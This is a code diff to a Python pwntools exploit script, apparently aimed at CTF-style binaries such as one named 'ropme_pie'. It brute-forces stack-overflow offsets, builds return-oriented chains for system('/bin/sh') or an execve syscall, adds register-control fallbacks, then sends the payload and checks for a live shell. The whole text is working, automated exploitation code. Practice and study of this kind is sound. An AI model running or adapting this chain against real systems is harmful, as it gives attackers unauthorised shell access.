@@ -105,26 +105,48 @@ for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48, 152, 168, 2
         base = resolve_base(io)
         elf.address = base                      # rebases symbols, gadgets and search() to absolute
         binsh = next(elf.search(b"/bin/sh\x00"), None)
-        rop = ROP(elf)
-        built = False
-        try:
-            sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
-            if binsh is not None and sysaddr:
+        built = False; chain = b""
+        sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
+        if binsh is not None and sysaddr:
+            try:
+                rop = ROP(elf)
                 try: rop.raw(rop.find_gadget(["ret"]).address)
                 except Exception: pass
-                rop.call(sysaddr, [binsh]); built = True         # ret2libc system('/bin/sh')
-            elif binsh is not None:
-                rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
-                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
-                if sc: rop.raw(sc.address); built = True          # execve('/bin/sh') syscall
-        except Exception:
-            built = False
+                rop.call(sysaddr, [binsh]); chain = rop.chain(); built = True   # ret2libc system('/bin/sh')
+            except Exception:
+                built = False
+        if not built and binsh is not None:
+            # execve('/bin/sh',0,0) via syscall. Prefer pwntools' high-level execve() helper: it can
+            # stitch together awkward gadgets that manual setRegisters() cannot -- e.g. a
+            # `pop rdx; leave; ret` (the only rdx control in some binaries) whose `leave` needs a
+            # stack pivot. Confirmed on ropme_pie: manual `rop.rdx=0` raises, rop.execve() builds a
+            # working chain and gets a shell.
+            try:
+                rop = ROP(elf)
+                rop.execve(binsh, 0, 0)
+                chain = rop.chain(); built = True
+            except Exception:
+                built = False
+            # Fallbacks if execve() can't: some binaries have no CLEAN `pop rdx`/`pop rsi` at all, so
+            # DON'T force them -- rely on rsi/rdx already being 0 at the crash site (common right
+            # after the vulnerable read). Try full register control first, then progressively fewer.
+            if not built:
+                for want in ({"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0},
+                             {"rax": 0x3b, "rdi": binsh, "rsi": 0},
+                             {"rax": 0x3b, "rdi": binsh}):
+                    try:
+                        rop = ROP(elf)
+                        sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                        if not sc:
+                            break               # no syscall gadget at all: another offset won't help
+                        for r, v in want.items():
+                            setattr(rop, r, v)
+                        rop.raw(sc.address)
+                        chain = rop.chain(); built = True; break
+                    except Exception:
+                        continue
         if not built:
             io.close(); break                   # gadgets/binsh missing: retrying won't help, next offset
-        try:
-            chain = rop.chain()
-        except Exception:
-            io.close(); break
         try:
             io.sendline(b"A" * off + chain)
             time.sleep(0.5); io.sendline(b"echo " + MARK)
